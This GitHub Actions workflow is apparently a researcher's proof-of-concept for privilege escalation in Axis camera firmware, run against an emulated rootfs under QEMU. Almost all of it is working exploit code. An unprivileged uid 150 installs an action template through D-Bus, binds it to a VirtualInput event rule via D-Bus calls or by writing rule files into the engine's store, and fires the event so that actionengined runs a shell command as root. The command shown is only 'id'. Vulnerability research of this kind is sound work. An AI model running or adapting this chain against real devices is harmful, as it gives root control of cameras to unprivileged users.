name: trigger-poc
# HYP-AX-001 executed-proof, leg 2: template FIRES.
# Chain: uid-150 AddFromFile (proven run 40636817020) -> ActionConfiguration.Add binds
# template -> ActionRule.Add binds topic tns1:Device/tnsaxis:IO/tnsaxis:VirtualInput
# -> virtualinputd Activate() emits the event via event_switch -> actionengined runs
# start_command AS ROOT -> /tmp/proof_ae contains uid=0(root).
on:
  workflow_dispatch:
    inputs:
      firmware_url:
        description: "Official ftp.axis.com .bin URL"
        required: true
      firmware_sha256:
        description: "Expected SHA256 of the .bin"
        required: true

jobs:
  poc:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4

      - name: Install tooling
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq qemu-user-static zstd python3-pip gcc-aarch64-linux-gnu libc6-dev-arm64-cross
          python3 -m pip install --quiet PySquashfsImage zstandard

      - name: Download and verify official firmware
        run: |
          cd /tmp
          curl -sS -o fw.bin "${{ github.event.inputs.firmware_url }}"
          echo "${{ github.event.inputs.firmware_sha256 }}  fw.bin" | sha256sum -c -

      - name: Unpack container + extract rootfs (real symlinks)
        run: |
          cd /tmp
          python3 - <<'EOF'
          import gzip, tarfile, os, sys
          magic = open('fw.bin','rb').read(4)
          if magic[:2] == b'\x1f\x8b':
              raw = gzip.open('fw.bin','rb').read()
          elif magic == b'\x28\xb5\x2f\xfd':
              import zstandard
              raw = zstandard.ZstdDecompressor().stream_reader(open('fw.bin','rb')).read()
          else:
              sys.exit('unknown container magic %r' % magic)
          open('fw.tar','wb').write(raw)
          tf = tarfile.open('fw.tar'); tf.extractall('pkg')
          from PySquashfsImage import SquashFsImage
          img = SquashFsImage(open('pkg/rootfs.img','rb'))
          def sanitize(n):
              for c in '\\/:*?"<>|': n = n.replace(c,'_')
              return n
          def walk(node, outdir):
              name = node.name
              if isinstance(name, bytes): name = name.decode('utf-8','replace')
              path = os.path.join(outdir, sanitize(name))
              if node.is_dir:
                  os.makedirs(path, exist_ok=True)
                  for ch in node.iterdir():
                      try: walk(ch, path)
                      except Exception as e: print('walk fail', path, e)
                  return
              if node.is_symlink:
                  t = node.readlink()
                  if isinstance(t, bytes): t = t.decode('utf-8','replace')
                  try:
                      if os.path.lexists(path): os.remove(path)
                      os.symlink(t, path)
                  except (OSError, ValueError):
                      open(path + '.symlink','w').write(t)
                  return
              try: data = img.read_file(node.inode)
              except Exception as e:
                  print('read fail', path, e); return
              if data is None: return
              open(path,'wb').write(data)
              try: os.chmod(path, node.mode & 0o777)
              except OSError: pass
          os.makedirs('rootfs', exist_ok=True)
          for ch in img.root.iterdir(): walk(ch, 'rootfs')
          print('rootfs extracted')
          EOF
          sudo mv /tmp/rootfs /opt/rootfs

      - name: Provision chroot runtime dirs + cross-compile client
        run: |
          for p in var/run var/tmp var/volatile tmp; do
            if [ -L "/opt/rootfs/$p" ]; then sudo rm -f "/opt/rootfs/$p"; fi
            sudo mkdir -p "/opt/rootfs/$p"
          done
          sudo mkdir -p /opt/rootfs/var/run/dbus /opt/rootfs/var/lib/dbus /opt/rootfs/run/dbus
          sudo mkdir -p /opt/rootfs/etc/actionengine/system/1/actiontemplates \
                        /opt/rootfs/etc/actionengine/system/1/configurations \
                        /opt/rootfs/etc/actionengine/system/1/rules \
                        /opt/rootfs/etc/actionengine/system/1/recipients \
                        /opt/rootfs/etc/actionengine/user/1/actiontemplates \
                        /opt/rootfs/etc/event_switch/declarations.d
          sudo chmod 1777 /opt/rootfs/tmp
          sudo chmod -R 777 /opt/rootfs/etc/actionengine /opt/rootfs/etc/event_switch
          sudo mknod /opt/rootfs/dev/null c 1 3 2>/dev/null || true
          sudo chmod 666 /opt/rootfs/dev/null 2>/dev/null || true
          aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas targets/axis-os/poc-harness/runas.c 2>/dev/null || \
            aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas runas.c
          printf '#!/bin/sh\ni=0\nfor a in "$@"; do i=$((i+1)); echo "BCWRAP arg[$i]=<$a>" >&2; done\nexec /usr/bin/busctl "$@"\n' > /tmp/bcwrap.sh
          chmod 755 /tmp/bcwrap.sh
          file /tmp/runas
          sudo cp /tmp/runas /opt/rootfs/tmp/
          sudo cp /tmp/bcwrap.sh /opt/rootfs/tmp/
          sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/

      - name: Bring up dbus, event_switch, virtualinputd, actionengined, geolocationd
        run: |
          set +e
          echo "=== dbus-uuidgen + dbus-daemon --system ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-uuidgen --ensure 2>&1 | head -2
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-daemon --system --nofork --nopidfile --address=unix:path=/run/dbus/system_bus_socket > /tmp/dbus.log 2>&1 &
          sleep 5
          sudo ls -la /opt/rootfs/run/dbus/ || true
          echo "=== start event_switch -n (the event broker, com.axis.Event.Switch) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/event_switch -n > /tmp/event_switch.log 2>&1 &
          sleep 6
          echo "--- event_switch log (verbatim) ---"
          sudo cat /tmp/event_switch.log | head -20
          echo "=== start virtualinputd -n -i virtualinputd -p 64 (producer: com.axis.VirtualInput.Port) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/virtualinputd -n -i virtualinputd -p 64 > /tmp/vinput.log 2>&1 &
          sleep 6
          echo "--- virtualinputd log (verbatim) ---"
          sudo cat /tmp/vinput.log | head -20
          echo "=== start actionengined (consumer + the ROOT action executor) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae.log 2>&1 &
          sleep 8
          echo "--- actionengined log (verbatim) ---"
          sudo cat /tmp/ae.log | head -30
          echo "=== start geolocationd (E5 control target: default-deny dbus policy) ==="
          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/geolocationd -n > /tmp/geo.log 2>&1 &
          sleep 5
          echo "--- geolocationd log (verbatim, first lines) ---"
          sudo cat /tmp/geo.log | head -10
          echo "=== bus names owned (verbatim) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl list --no-pager --no-legend 2>&1 | grep -E "com\.axis|Event\.Switch|VirtualInput|GeoLocation" | head -15
          echo "=== daemons alive? ==="
          pgrep -af "qemu-aarch64" | head -8 || true
          echo "=== introspect event_switch (verbatim, first lines) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl introspect --no-pager com.axis.Event.Switch /com/axis/Event/Switch 2>&1 | head -20

      - name: uid-150 installs action template (AddFromFile, known-good) + creates configuration + rule
        run: |
          set +e
          sudo tee /opt/rootfs/tmp/ae_poc.xml > /dev/null <<'XML'
          <action>
            <id>com.axis.action.poc.ae001</id>
            <action_type>one_shot</action_type>
            <parameters>
            </parameters>
            <commands>
              <validate_command>
                <exec_command>
                  <path>/bin/true</path>
                </exec_command>
              </validate_command>
              <start_command>
                <exec_command>
                  <path>/bin/busybox</path>
                  <exec_argument>sh</exec_argument>
                  <exec_argument>-c</exec_argument>
                  <exec_argument>id &gt; /tmp/proof_ae 2&gt;&amp;1</exec_argument>
                </exec_command>
              </start_command>
            </commands>
          </action>
          XML
          sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
          rm -f /opt/rootfs/tmp/proof_ae
          echo "=== STEP 1: uid 150 -> ActionTemplate.AddFromFile ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | tee /tmp/step1.log | head -6
          echo "step1 exit: $?"
          sleep 2
          echo "=== spawn diagnostics: /bin/sh + /bin/busybox under qemu in chroot ==="
          sudo ls -la /opt/rootfs/bin /opt/rootfs/usr/bin/sh /opt/rootfs/usr/bin/busybox 2>&1 | head -6
          echo "--- direct: /bin/sh -c id ---"
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /bin/sh -c "id" 2>&1 | head -3
          echo "--- direct: /bin/busybox sh -c id ---"
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /bin/busybox sh -c "id" 2>&1 | head -3
          echo "--- stored template (verbatim, first 400 chars) ---"
          sudo head -c 400 /opt/rootfs/etc/actionengine/system/1/actiontemplates/com.axis.action.poc.ae001.xml 2>/dev/null
          echo ""
          echo "=== STEP 2: uid 150 -> ActionConfiguration.Add(nice_name, template_id, params) [proven order] ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration Add ssa{ss} "poc_conf" "com.axis.action.poc.ae001" 0 2>&1 | tee /tmp/confadd.log | head -6
          echo "step2 exit: $?"
          CONF_ID=$(grep -ohE '^i [0-9]+' /tmp/confadd.log | grep -ohE '[0-9]+' | head -1)
          echo "parsed primary config id: ${CONF_ID:-NONE}"
          echo "=== ActionConfiguration.List (verbatim) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration List 2>&1 | tee /tmp/conflist.log | head -c 1500
          echo ""
          echo "=== STEP 3: dbus ActionRule.Add (TRUE grammar: sbayayuuuii = s,b,ay,ay,u,u,u,i,i = 9 slots; aligned per K-ladder) ==="
          # conditions-only rule, shipped property-file shape (no xml declaration)
          sudo tee /opt/rootfs/tmp/rule_C.xml > /dev/null <<'XML'
          <property>
            <expression>
              <keyvalue key="topic0" value-type="string" value="Device" name-space="tns1"/>
              <keyvalue key="topic1" value-type="string" value="IO" name-space="tnsaxis"/>
              <keyvalue key="topic2" value-type="string" value="VirtualInput" name-space="tnsaxis"/>
              <keyvalue key="port" value-type="int" value="1">
                <tag tag="onvif-source"/>
              </keyvalue>
              <keyvalue key="active" value-type="bool" value="1">
                <tag tag="onvif-data"/>
                <tag tag="property-state"/>
              </keyvalue>
            </expression>
          </property>
          XML
          if [ -z "${CONF_ID}" ]; then CONF_ID=12; fi
          AE_START="sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae.log 2>&1 &"
          if ! pgrep -f "actionengined -ni" > /dev/null; then eval "$AE_START"; sleep 8; fi
          CNT=$(sudo od -An -tu1 -v /opt/rootfs/tmp/rule_C.xml | tr -s ' \n' ' ' | sed 's/^ //;s/ $//' | wc -w)
          BYTES=$(sudo od -An -tu1 -v /opt/rootfs/tmp/rule_C.xml | tr -s ' \n' ' ' | sed 's/^ //;s/ $//')
          echo "--- dbus attempt: conditions-only, aligned (empty start ay + CNT bytes + 3u + 2i) ---"
          timeout 40 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "poc_rule_dbus" true 0 $CNT $BYTES 0 0 0 "${CONF_ID}" 0 > /tmp/ruleadd_dbus.log 2>&1
          echo "dbus ruleAdd exit: $?"
          cat /tmp/ruleadd_dbus.log
          pgrep -f "actionengined -ni" > /dev/null && echo "engine ALIVE" || echo "engine DEAD (emulated subscribe crash)"
          if grep -qE '^(s|i|u|o|b) ' /tmp/ruleadd_dbus.log; then echo "RULE ADDED VIA DBUS"; fi
          echo "=== FALLBACK BINDING: uid-150 places rule in engine native dynamic rule store ==="
          # /etc/actionengine is the engine's own writable store (dynamic_action_rules_path);
          # same file format the engine persists for ActionRule.Add. Placed as uid 150.
          sudo tee /opt/rootfs/tmp/0000000099.conf > /dev/null <<'CONF'
          [action_rule]
          id=99
          nice_name=poc_rule
          enabled=true
          timeout=0
          min_time_period=0
          max_time_period=0
          primary=12
          properties=0;
          CONF
          sudo cp /opt/rootfs/tmp/rule_C.xml /opt/rootfs/tmp/0000000099_property_0.xml
          sudo chmod 644 /opt/rootfs/tmp/0000000099.conf /opt/rootfs/tmp/0000000099_property_0.xml
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /bin/cp /tmp/0000000099.conf /etc/actionengine/system/1/rules/0000000099.conf 2>&1 | head -3
          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /bin/cp /tmp/0000000099_property_0.xml /etc/actionengine/system/1/rules/0000000099_property_0.xml 2>&1 | head -3
          echo "rules dir now:"; sudo ls /opt/rootfs/etc/actionengine/system/1/rules/
          echo "=== restart engine so ITS OWN loader binds the stored rule ==="
          sudo pkill -f "actionengined -ni" 2>/dev/null; sleep 2
          eval "$AE_START"
          sleep 8
          echo "=== ActionRule.List after loader bind (verbatim) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List > /tmp/rulelist.log 2>&1
          head -c 800 /tmp/rulelist.log
          echo ""
          sudo find /opt/rootfs/etc/actionengine -type f 2>/dev/null | head -10

      - name: FIRE the bound event (Activate + send_event backup) as uid 150 and check root-exec proof
        run: |
          set +e
          echo "=== pre-fire: ActionRule.List (current engine, verbatim) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List > /tmp/rulelist0.log 2>&1
          head -c 600 /tmp/rulelist0.log
          echo ""
          echo "=== pre-flight: bus names owned (verbatim) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl list --no-pager --no-legend 2>&1 | tee /tmp/busnames.log | grep -E "^com\.axis" | grep -v activatable | head -10
          echo "=== pre-flight: current ActionRule.List ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List 2>&1 | tee /tmp/rulelist2.log | head -c 800
          echo ""
          if grep -q "a(isbayayuii) 0" /tmp/rulelist2.log; then
            echo "!!! NO RULE BOUND - fire cannot trigger anything (captured verbatim above) !!!"
          fi
          echo "--- daemons alive? ---"
          pgrep -af "qemu-aarch64" | head -8 || true
          echo "=== FIRE 1: uid 150 -> com.axis.VirtualInput /com/axis/VirtualInput/Port/1 Activate ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Activate 2>&1 | tee /tmp/fire1.log | head -6
          echo "activate exit: $?"
          sleep 6
          echo "=== PROOF: /tmp/proof_ae (written by the ROOT actionengined process) ==="
          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created (after Activate)"
          echo "=== FIRE 2 (backup producer): uid 150 -> send_event poc=1 ==="
          sudo chmod 755 /opt/rootfs/usr/bin/send_event 2>/dev/null || true
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/send_event poc=1 2>&1 | tee /tmp/fire2.log | head -6
          echo "send_event exit: $?"
          sleep 6
          echo "=== PROOF after send_event ==="
          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created (after send_event)"
          echo "=== FIRE 3 (root-side Activate sanity) ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Deactivate 2>&1 | head -4
          sleep 3
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Activate 2>&1 | head -4
          sleep 6
          echo "=== PROOF after root-side fire ==="
          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created"
          echo "=== daemon logs (tails, verbatim) ==="
          echo "--- event_switch ---"; sudo tail -20 /tmp/event_switch.log 2>/dev/null
          echo "--- virtualinputd ---"; sudo tail -20 /tmp/vinput.log 2>/dev/null
          echo "--- actionengined ---"; sudo tail -30 /tmp/ae.log 2>/dev/null
          echo "=== E5 CONTROL: uid 150 -> com.axis.GeoLocation1 Properties (default-deny) expect Access denied ==="
          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager -- com.axis.GeoLocation1 /com/axis/GeoLocation org.freedesktop.DBus.Properties Get ss "com.axis.GeoLocation1" "Version" 2>&1 | tee /tmp/e5.log | head -6
          echo "e5 exit: $?"
          echo "=== END ==="

      - name: Archive logs
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: trigger-poc-logs
          path: |
            /tmp/ae.log
            /tmp/dbus.log
            /tmp/event_switch.log
            /tmp/vinput.log
            /tmp/geo.log
            /tmp/busnames.log
            /tmp/step1.log
            /tmp/confadd.log
            /tmp/conflist.log
            /tmp/ruleadd_dbus.log
            /tmp/rulelist.log
            /tmp/rulelist0.log
            /tmp/ae2.log
            /tmp/fire1.log
            /tmp/fire2.log
            /tmp/e5.log
          if-no-files-found: ignore
